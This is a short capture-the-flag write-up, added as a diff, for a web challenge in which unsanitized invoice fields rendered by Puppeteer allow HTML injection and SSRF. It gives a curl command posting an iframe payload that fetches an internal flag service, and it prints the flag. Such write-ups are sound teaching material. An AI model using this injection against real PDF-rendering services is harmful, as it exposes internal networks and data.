@@ -1,0 +1,42 @@
+---
+title: 'LA CTF 2026 - Invoice Generator'
+description: 'Writeup for Invoice Generator from LA CTF 2026. A Web challenge involving PDF generation and SSRF via XSS.'
+date: 2026-02-09
+tags: ['writeup', 'web', 'pdf', 'ssrf', 'xss', 'lactf']
+authors: ['kudaliar']
+draft: false
+---
+
+**Flag:** `lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}`
+
+## Challenge Overview
+
+A web application that generates PDF invoices using Puppeteer. It consists of two Docker services on an internal network:
+
+- **invoice-generator** (port 3000) - Takes user input, builds an HTML template, and renders it to PDF via Puppeteer.
+- **flag** (internal, port 8081) - Serves the flag at `GET /flag`, only reachable from the internal Docker network.
+
+## Vulnerability
+
+The user-supplied fields (`name`, `item`, `datePurchased`) are interpolated directly into the HTML template without any sanitization in `server.js`:
+
+```js
+${name}            // line 189
+${item}            // line 203
+${datePurchased}   // line 230
+```
+
+Since Puppeteer renders the HTML with a real Chromium browser, any injected HTML tags (including `<iframe>`) are processed. This allows Server-Side Request Forgery (SSRF) — we can make the server-side browser fetch resources from the internal network.
+
+## Exploit
+
+Inject an `<iframe>` pointing to the internal flag service into one of the input fields. The Docker Compose service name `flag` resolves to the flag container on the internal network.
+
+```bash
+curl -X POST https://<TARGET>/generate-invoice \
+  -H "Content-Type: application/json" \
+  -d '{"name":"<iframe src=\"http://flag:8081/flag\" width=\"500\" height=\"200\"></iframe>","item":"x","cost":"1","datePurchased":"2025-01-01"}' \
+  -o invoice.pdf
+```
+
+Opening the resulting PDF reveals the flag rendered inside the iframe.
